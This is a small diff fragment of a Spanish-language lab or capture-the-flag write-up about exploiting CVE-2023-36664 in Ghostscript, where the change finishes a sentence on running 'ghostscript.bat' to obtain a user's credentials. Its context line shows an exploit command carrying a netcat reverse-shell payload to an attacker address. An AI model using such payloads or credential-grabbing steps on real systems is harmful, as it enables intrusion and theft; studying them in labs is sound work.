@@ -200,5 +200,6 @@ python3 CVE_2023_36664_exploit.py --inject --payload "nc.exe 10.10.14.81 4444 -e
 ![[Pasted image 20240413004557.png]]
 
 ### Escalada de privilegios
-una ves estamos dentro de la maquina podemos ejecutar el script `ghostscript.bat` para obtener las cre 
+una ves estamos dentro de la maquina podemos ejecutar el script `ghostscript.bat` para obtener las credenciales de `drbrown` 
 ![[Pasted image 20240413005446.png]]
+
